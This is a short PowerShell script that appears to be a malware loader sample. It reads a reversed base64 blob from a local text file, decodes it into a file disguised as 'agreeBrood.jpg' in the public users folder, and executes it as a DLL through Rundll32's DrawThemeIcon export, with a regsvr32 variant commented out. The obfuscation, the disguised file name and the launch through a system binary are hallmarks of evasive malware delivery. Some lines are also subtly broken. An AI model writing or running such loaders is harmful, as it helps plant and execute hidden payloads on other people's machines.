$b64 = Get-Content -Path 'fix\data.txt';
$b64[-1..-($b64.Length)] -join '';
$r = $b64.ToCharArray();
[array]::Reverse($r);
-join($r);

$filename = 'C:\users\public\agreeBrood.jpg';
$bytes = [Convert]::FromBase64String($r);
[IO.File]::WriteAllBytes($filename, $bytes);

# start-process regsvr32 $filename;
start-process Rundll32 $filename,DrawThemeIcon;


